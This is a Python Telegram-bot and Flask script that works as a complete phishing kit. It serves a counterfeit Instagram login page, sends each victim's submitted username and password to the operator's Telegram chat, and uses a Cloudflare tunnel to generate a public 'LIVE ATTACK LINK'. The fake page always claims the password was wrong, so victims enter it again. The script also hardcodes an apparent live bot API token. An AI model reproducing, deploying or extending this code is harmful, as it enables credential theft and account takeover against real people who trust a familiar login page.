import telebot
from flask import Flask, request, render_template_string
import threading
import os
import subprocess
import re
import json
import requests

# --- [ CONFIGURATION ] ---
API_TOKEN = '8666034301:AAHksgPWYvDYtNLXqsuQpq6ycVErcqnQBAA'
CH_ID = "@ZXINOXHAX"

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
HEADER = "💜 <b>ZXINOX ELITE OS</b> 💜\n"

# --- [ WEB INTERFACE - ORIGINAL DARK PURPLE VIBE ] ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #0a0a0a; border: 1px solid #7b2cbf; padding: 40px; width: 320px; border-radius: 15px; box-shadow: 0 0 40px rgba(123, 44, 191, 0.5); text-align: center; }
        .logo { font-size: 40px; font-weight: bold; margin-bottom: 5px; background: linear-gradient(to right, #7b2cbf, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #7b2cbf; font-size: 11px; letter-spacing: 2px; font-weight: bold; margin-bottom: 25px; text-transform: uppercase; }
        .error-msg { border: 1px solid #ed4956; color: #ed4956; padding: 10px; font-size: 13px; margin-bottom: 15px; border-radius: 4px; display: {{ 'block' if error else 'none' }}; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #222; background: #111; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #7b2cbf; box-shadow: 0 0 10px #7b2cbf; }
        button { width: 100%; padding: 12px; background: #7b2cbf; border: none; color: #fff; font-weight: bold; border-radius: 5px; margin-top: 15px; cursor: pointer; font-size: 16px; }
        button:active { transform: scale(0.98); }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <div class="sub">Secure Authentication</div>
        <div class="error-msg">The password you entered is incorrect. Please try again.</div>
        <form method="post">
            <input type="text" name="u" placeholder="Phone number, username, or email" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/<uid>', methods=['GET', 'POST'])
def index(uid):
    error = False
    if request.method == 'POST':
        u = request.form.get('u')
        p = request.form.get('p')
        # Victim Data Alert
        alert = (f"{HEADER}───────────────────────\n"
                 f"👤 <b>VICTIM:</b> <code>{u}</code>\n"
                 f"🔑 <b>PASS:</b> <code>{p}</code>\n"
                 f"───────────────────────\n"
                 f"⚡ <b>STATUS:</b> Data Saved ✅")
        bot.send_message(uid, alert, parse_mode='HTML')
        error = True 
    return render_template_string(HTML_TEMPLATE, error=error)

# --- [ AUTO-LINK GENERATOR ] ---
def start_tunnel(uid):
    os.system("pkill cloudflared")
    bot.send_message(uid, "⚙️ <b>Generating Toxic Link...</b>", parse_mode='HTML')
    # Link generate karne ke liye command
    cmd = "cloudflared tunnel --url http://127.0.0.1:10000"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in proc.stdout:
        if "trycloudflare.com" in line:
            link = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if link:
                bot.send_message(uid, f"{HEADER}🔗 <b>LIVE ATTACK LINK:</b>\n\n<code>{link.group(0)}/{uid}</code>", parse_mode='HTML')
                break

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🚀 GENERATE LINK", callback_data="gen"))
    bot.send_message(message.chat.id, f"{HEADER}System Ready Sir! Click below.", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "gen")
def gen(call):
    threading.Thread(target=start_tunnel, args=(str(call.message.chat.id),)).start()

if __name__ == "__main__":
    # Flask running in background
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    bot.infinity_polling()
